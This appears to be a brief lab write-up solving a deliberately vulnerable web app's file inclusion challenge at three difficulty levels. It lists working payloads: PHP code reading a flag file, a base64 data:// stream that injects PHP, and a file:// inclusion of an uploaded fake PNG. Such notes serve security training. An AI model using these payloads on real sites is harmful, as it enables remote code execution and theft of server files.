# File Inclusion

## low

just RFI

```php
<?php echo file_get_contents("../../hackable/flags/fi.php"); ?>
```

## medium

php base64 data stream

```
?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL3Zhci93d3cvaHRtbC9oYWNrYWJsZS9mbGFncy9maS5waHAiKTs/Pg==
```

## high

upload `a.png` and LFI with php file stream

see `upload.md` and `fakepng.asm`

```
?page=file:///var/www/html/hackable/uploads/a.png
```
